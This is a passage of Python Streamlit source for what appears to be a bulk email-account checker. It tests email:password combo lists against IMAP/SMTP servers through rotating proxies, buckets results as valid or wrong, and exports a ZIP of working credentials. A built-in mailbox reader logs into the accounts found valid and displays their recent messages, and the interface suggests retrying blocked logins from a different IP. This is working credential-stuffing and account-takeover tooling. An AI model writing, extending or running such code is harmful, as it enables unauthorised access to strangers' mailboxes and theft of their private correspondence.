
                    if total_accs > 0:
                        pct = min(1.0, checked_count / total_accs)
                        progress_bar.progress(
                            pct, text=f"Checking accounts [{engine_action_mode}]: "
                                      f"{checked_count}/{total_accs} ({int(pct * 100)}%)")
                    with session_state_lock:
                        v_len = len(str_lit.session_state.valid_results)
                        w_len = len(str_lit.session_state.wrong_results)
                        rt_len = len(str_lit.session_state.retry_results)
                        px_len = len(str_lit.session_state.proxy_results)
                        ld_len = len(str_lit.session_state.login_drop_results)
                    status_text.text(
                        f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | "
                        f"Wrong: {w_len} | Login Dropped: {ld_len} | Proxy Dead: {px_len} | "
                        f"RETRY_LATER: {rt_len}")

            finally:
                executor.shutdown(wait=False)

        except MemoryError as me:
            run_interrupted = True
            detected_stop_reason = "Resource Exhaustion: RAM full / Out of Memory"
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: RAM Full: {me}")
        except (socket.timeout, ConnectionError, ssl.SSLError) as net_err:
            run_interrupted = True
            detected_stop_reason = f"Network Connection Failure: {net_err}"
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except (OSError, IOError) as oe:
            run_interrupted = True
            detected_stop_reason = ("Resource Exhaustion: Disk Space / ROM full"
                                    if getattr(oe, 'errno', 0) == 28
                                    else f"Filesystem / I/O Error: {oe}")
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except BaseException as be:
            if isinstance(be, (SystemExit, KeyboardInterrupt)):
                run_interrupted = True
                detected_stop_reason = "System Shutdown / Interruption"
                raise be
            run_interrupted = True
            _bn = type(be).__name__
            if _bn in ("RerunException", "StopException", "ScriptStopped"):
                detected_stop_reason = "User Interruption: UI interaction (Streamlit rerun)"
                log_probe_event("run stopped by a Streamlit RerunException/StopException")
            else:
                be_str = str(be).lower()
                if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket",
                                             "closed", "connection lost"]):
                    detected_stop_reason = "User Interruption: UI interaction"
                else:
                    detected_stop_reason = f"Unexpected Error / Interruption: {be}"
            runstate.note(detected_stop_reason)
        finally:
            # Restore the slider's own deadline so the sidebar does not report
            # unapplied settings after a run that used the tail cap.
            if _orig_deadline is not None:
                CFG["ACCOUNT_DEADLINE"] = _orig_deadline
            STATE["run_active"] = False
            str_lit.session_state["run_active"] = False
            with session_state_lock:
                done = set(str_lit.session_state.checked_emails_set)
            left = [raw for raw in all_target_accounts
                    if (raw.split(":", 1)[0].strip().lower() if ":" in raw else raw) not in done]
            if checked_count >= total_accs and not run_interrupted:
                # Clean completion: close the watchdog record, then drop the data.
                runstate.finish()
                clear_unfinished()
            elif left:
                save_unfinished(detected_stop_reason, left, checked_count, total_accs)

        end_dt = datetime.now()
        duration = end_dt - start_dt

        with session_state_lock:
            str_lit.session_state.run_completion_status = (
                "Successful" if (checked_count >= total_accs and not run_interrupted)
                else "Unfinished")
            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
            valid_snapshot = list(str_lit.session_state.valid_results)
            wrong_snapshot = list(str_lit.session_state.wrong_results)
            need_snapshot = list(str_lit.session_state.need_app_results)
            login_drop_snapshot = list(str_lit.session_state.login_drop_results)
            conn_snapshot = list(str_lit.session_state.conn_results)
            proxy_snapshot = list(str_lit.session_state.proxy_results)
            retry_snapshot = list(str_lit.session_state.retry_results)
            rbl_snapshot = list(str_lit.session_state.rbl_results)
            smtp_snapshot = list(str_lit.session_state.smtp_results)
            dns_snapshot = list(str_lit.session_state.dns_results)
            skip_snapshot = list(str_lit.session_state.skip_results)
            unknown_snapshot = list(str_lit.session_state.unknown_results)

        invalidate_valid_caches()

        progress_bar.progress(1.0, text="Checking complete!")
        status_text.success(
            f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | "
            f"Ended: {str_lit.session_state.end_timestamp} | "
            f"Duration: {str_lit.session_state.total_duration}")
# @@END 106 RUN_LOOP

# @@BLOCK 107 RUN_EXPORT deps=078,106
        try:
            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
            proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
            login_drop_path = os.path.join(CFG["RESULTS_DIR"], f"login_dropped_{stamp}.txt")
            retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
            rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
            smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
            dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
            skip_path = os.path.join(CFG["RESULTS_DIR"], f"skipped_{stamp}.txt")
            unknown_path = os.path.join(CFG["RESULTS_DIR"], f"unclassified_{stamp}.txt")
            try:
                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
            except OSError:
                pass

            hdr = (f"# Started: {str_lit.session_state.start_timestamp} | "
                   f"Ended: {str_lit.session_state.end_timestamp} | "
                   f"Duration: {str_lit.session_state.total_duration} | "
                   f"Protocols: {'+'.join(active_protocols())} | Build: {BUILD_TAG}\n")
            with file_write_lock:
                for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
                                   (need_path, need_snapshot),
                                   (login_drop_path, login_drop_snapshot),
                                   (failed_path, conn_snapshot),
                                   (proxy_path, proxy_snapshot),
                                   (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot),
                                   (skip_path, skip_snapshot), (unknown_path, unknown_snapshot)):
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(hdr)
                        f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))

            clean_valid_path = CLEAN_VALID_FILE
            temp_clean_count = _write_clean_valid(hdr, valid_snapshot)

            zip_output_name = f"mail_results_{stamp}.zip"
            with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
                for p, arc in ((clean_valid_path, "valid_email_password.txt"),
                               (wrong_path, os.path.basename(wrong_path)),
                               (need_path, os.path.basename(need_path)),
                               (login_drop_path, os.path.basename(login_drop_path)),
                               (failed_path, os.path.basename(failed_path)),
                               (proxy_path, os.path.basename(proxy_path)),
                               (retry_path, os.path.basename(retry_path)),
                               (rbl_path, os.path.basename(rbl_path)),
                               (smtp_path, os.path.basename(smtp_path)),
                               (dns_path, os.path.basename(dns_path)),
                               (skip_path, os.path.basename(skip_path)),
                               (unknown_path, os.path.basename(unknown_path))):
                    if os.path.exists(p):
                        z.write(p, arcname=arc)

            zip_bytes_data = b""
            if os.path.exists(zip_output_name):
                with open(zip_output_name, "rb") as fp:
                    zip_bytes_data = fp.read()

            with session_state_lock:
                str_lit.session_state.clean_valid_count = temp_clean_count
                str_lit.session_state.zip_name = zip_output_name
                str_lit.session_state.zip_bytes = zip_bytes_data
        except Exception as ex:
            str_lit.error(f"Error compiling results export files: {ex}")
# @@END 107 RUN_EXPORT

# @@BLOCK 108 RESULTS_SUMMARY deps=007,035,036,037,087,106
if str_lit.session_state.engine_has_run or load_persistent_valid_results():
    section_title("📊", "Live Results Summary & ZIP Archive",
                  "persisted results, downloadable bundle, full under-the-hood traces")

    with session_state_lock:
        status_label = ("🎉 Check Complete!"
                        if str_lit.session_state.run_completion_status == "Successful"
                        else "⚠️ Unfinished / Loaded from Disk")
        clean_count_val = str_lit.session_state.get("run_valid_count",
                                                    str_lit.session_state.clean_valid_count)
        wrong_len_val = len(str_lit.session_state.wrong_results)
        need_len_val = len(str_lit.session_state.need_app_results)
        login_drop_len_val = len(str_lit.session_state.login_drop_results)
        conn_len_val = len(str_lit.session_state.conn_results)
        proxy_len_val = len(str_lit.session_state.proxy_results)
        retry_len_val = len(str_lit.session_state.retry_results)
        rbl_len_val = len(str_lit.session_state.rbl_results)
        smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
        dns_len_val = len(str_lit.session_state.get("pre_dns_failed", []))
        skip_len_val = len(str_lit.session_state.skip_results)
        unknown_len_val = len(str_lit.session_state.unknown_results)
        valid_res_copy = list(str_lit.session_state.valid_results)
        log_lines_copy = list(str_lit.session_state.log_lines)
        report_entries_copy = list(str_lit.session_state.report_entries)
        zip_bytes_copy = str_lit.session_state.zip_bytes
        zip_name_copy = str_lit.session_state.zip_name
        start_ts_copy = str_lit.session_state.start_timestamp
        end_ts_copy = str_lit.session_state.end_timestamp
        duration_copy = str_lit.session_state.total_duration
        summary_buckets = {
            "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
            "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
            "🚪 Login Dropped (* BYE) - server answered, password untested":
                list(str_lit.session_state.login_drop_results),
            "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
            "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
            "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
            "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
            "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
            "🛰 DNS Failed (pre-check)": list(str_lit.session_state.get("pre_dns_failed", [])),
            "📮 SMTP Failed (pre-check)": list(str_lit.session_state.get("pre_smtp_failed", [])),
            "⏭ Skipped / Filtered": list(str_lit.session_state.skip_results),
            "❓ Unclassified": list(str_lit.session_state.unknown_results),
        }

    str_lit.markdown(f"### {status_label}")
    str_lit.caption(f"Protocols dialled this run: **{' + '.join(active_protocols())}**"
                    + ("  ·  SMTP/ManageSieve were CONFIRM-ONLY"
                       if any(p in ("SMTP", "ManageSieve") for p in active_protocols()) else ""))

    if str_lit.session_state.run_completion_status == "Unfinished":
        # FIX RS-4: the reason came from list_unfinished_runs(), so the TypeError
        # in block 083 degraded this to a bare warning with no cause and no
        # progress. It reads the watchdog record and remaining() directly now.
        _rec = runstate.load() or {}
        _left = runstate.remaining()
        if _rec or _left:
            str_lit.warning(
                f"⚠ **Engine Stopped Unfinished:** Reason: "
                f"*{_rec.get('reason') or _rec.get('cause') or 'Unknown'}* | "
                f"Progress at stop: {_rec.get('checked', 0)}/{_rec.get('total', 0)} | "
                f"**{len(_left)} account(s) still to check** - set Engine Action Mode "
                f"to 'Resume Unfinished' and press Start to continue.")
        else:
            str_lit.warning("⚠ **Engine Stopped Unfinished.**")

    if start_ts_copy and end_ts_copy:
        str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | "
                     f"Ended **{end_ts_copy}** | Duration **{duration_copy}**")

    _s_pairs = [
        ("✅ Clean Valid", clean_count_val),
        ("❌ Wrong Password", wrong_len_val),
        ("🔑 App Password / 2FA", need_len_val),
        ("🚪 Login Dropped", login_drop_len_val),
        ("🔌 Connection Failed", conn_len_val),
        ("🩹 Proxy Unhealthy", proxy_len_val),
        ("🚫 RBL Blocked", rbl_len_val),
        ("🕓 RETRY_LATER", retry_len_val),
        ("🛰 DNS Failed", dns_len_val),
        ("📮 SMTP Failed", smtp_len_val),
        ("⏭ Skipped", skip_len_val),
        ("❓ Unclassified", unknown_len_val),
        ("📚 Accounts In Buckets",
         clean_count_val + wrong_len_val + need_len_val + login_drop_len_val
         + conn_len_val + proxy_len_val + rbl_len_val + retry_len_val + skip_len_val
         + unknown_len_val),
    ]
    for _sc, (_sl, _sv) in zip(metric_grid(_s_pairs, per_row=3), _s_pairs):
        _sc.metric(_sl, _sv)

    if login_drop_len_val:
        str_lit.warning(
            f"🚪 **{login_drop_len_val} account(s) hit a LOGIN DROP** - the mail server "
            f"ANSWERED, accepted the LOGIN command and then closed the socket (* BYE). "
            f"These passwords are still UNTESTED: it is usually a rejected password or an "
            f"app-password requirement, so retry them from a different IP (or with an app "
            f"password) before discarding them.")
    if proxy_len_val:
        str_lit.warning(
            f"🩹 **{proxy_len_val} account(s) never reached a mailbox** - every attempt died "
            f"with 407 Proxy Authentication Required. Those passwords are still UNTESTED.")
    if skip_len_val:
        str_lit.info(
            f"⏭ **{skip_len_val} account(s) were skipped** (bad format / disposable / "
            f"fast-mode cooldown). They were counted as checked; they are listed in the "
            f"Skipped bucket and the ZIP.")
    if wrong_len_val and CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True):
        str_lit.caption(
            "❌ Wrong Password was CONFIRMED across at least two hosts or two rungs (or with "
            "no candidate left to dial) before being accepted. Turn the sidebar guard OFF "
            "only if you need raw speed.")

    for title, items in summary_buckets.items():
        with str_lit.expander(f"{title} ({len(items)})", expanded=False):
            if not items:
                str_lit.caption("nothing here yet")
                continue
            _safe = "".join(ch if ch.isalnum() else "_" for ch in title).strip("_")
            str_lit.download_button(
                f"Download these {len(items)} line(s)",
                data="\n".join(str(i) for i in items).encode("utf-8"),
                file_name=f"{_safe}_{len(items)}.txt",
                mime="text/plain", key=f"sumdl_{_safe}")
            for it in items:
                str_lit.code(it, language="text")

    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream",
                                             "📊 Live Report Log & Analytics"])
    with exec_tab1_p:
        if log_lines_copy:
            render_logs(log_lines_copy)
        else:
            str_lit.info("No logs available from previous run.")
    with exec_tab2_p:
        if report_entries_copy:
            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]),
                              width="stretch", height=320)
        else:
            str_lit.info("No report logs available.")

    if zip_bytes_copy and zip_name_copy:
        str_lit.download_button("📦 Download All Results (.zip Package)", data=zip_bytes_copy,
                                file_name=zip_name_copy, mime="application/zip")
# @@END 108 RESULTS_SUMMARY

# @@BLOCK 109 IN_APP_READER deps=034,053,062,069,093,098
section_title("📬", "Mailbox Reader (Interactive Inbox Inspection)",
              "read verified inboxes without leaving the app")

with session_state_lock:
    current_valid_set = list(str_lit.session_state.valid_results) or load_persistent_valid_results()

if not current_valid_set:
    str_lit.info("Run the checker successfully or ensure valid account files exist to "
                 "populate valid accounts.")
else:
    valid_combo_options = []
    for item in current_valid_set:
        try:
            if ":" in item:
                email_val, remainder = item.split(":", 1)
                valid_combo_options.append(f"{email_val.strip()}:{remainder.split('|')[0].strip()}")
        except Exception:
            continue

    if valid_combo_options:
        selected_combo = str_lit.selectbox("Select Valid Account to Read:",
                                           options=valid_combo_options, key="bb_reader_acct")
        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", 1, 50, 10, 1,
                                  key="bb_reader_max")

        if str_lit.button("📖 Read Inbox Messages"):
            if selected_combo:
                acc_email, acc_pass = selected_combo.split(":", 1)
                acc_email, acc_pass = acc_email.strip(), acc_pass.strip()
                imap_hosts = get_servers(acc_email).get("imap", [])
                mailbox_proxy = (sample_alive_proxy(domain=acc_email.split("@")[-1])
                                 if use_proxy else None)

                if not imap_hosts:
                    str_lit.error("No IMAP host available for this provider domain name.")
                else:
                    with str_lit.spinner(f"Connecting via [{px_tag(mailbox_proxy)}] and "
                                         f"fetching inbox for {acc_email}..."):
                        # v13.48: read_mailbox_messages() already resolves the whole
                        # host ladder itself via get_servers() and falls back to the
                        # host passed in. The old `for srv in imap_hosts:` loop re-ran
                        # that entire ladder once per host, so a 4-host domain could
                        # open 4x4 ladders and burn proxy credit before giving up.
                        success_read, fetched_msgs = False, []
                        msgs = read_mailbox_messages(acc_email, acc_pass, imap_hosts[0],
                                                     proxy_str=mailbox_proxy,
                                                     limit=max_msgs)
                        if msgs and not any("Error reading mailbox" in m for m in msgs):
                            fetched_msgs, success_read = msgs, True
                        elif msgs:
                            fetched_msgs = msgs
                        if success_read:
                            str_lit.success("Successfully retrieved recent messages "
                                            "from mailbox!")
                            for idx, m_content in enumerate(fetched_msgs, 1):
                                str_lit.markdown(f"**Message {idx}:**")
                                str_lit.code(m_content, language="text")
                        else:
                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
# @@END 109 IN_APP_READER

# @@BLOCK 110 FOOTER deps=008,034
section_title("🧭", "Navigation", f"{BUILD_TAG} - block edition")

_n1, _n2, _n3, _n4 = str_lit.columns(4)
with _n1:
    try:
        str_lit.page_link("pages/3_Mailbox_Reader.py", label="📥 Mailbox Reader",
                          width="stretch")
    except Exception:
        str_lit.caption("Reader lives at pages/3_Mailbox_Reader.py")
with _n2:
    try:
        str_lit.page_link("pages/2_Diagnostics.py", label="🔍 Diagnostics",
                          width="stretch")
    except Exception:
        str_lit.caption("Diagnostics lives at pages/2_Diagnostics.py")
with _n3:
    try:
        str_lit.page_link("pages/4_Downloads.py", label="📦 Export Studio",
                          width="stretch")
    except Exception:
        str_lit.caption("Export Studio lives at pages/4_Downloads.py")
with _n4:
    try:
        str_lit.page_link("pages/6_User_Guide.py", label="📖 User Guide",
                          width="stretch")
    except Exception:
        str_lit.caption("User Guide lives at pages/6_User_Guide.py")

str_lit.caption(
    f"Build {BUILD_TAG} · CFG {CFG_VERSION} · block edition. "
    f"Every section is a replaceable @@BLOCK - run verify_blocks.py after every paste."
)
# @@END 110 FOOTER
# @@EOF
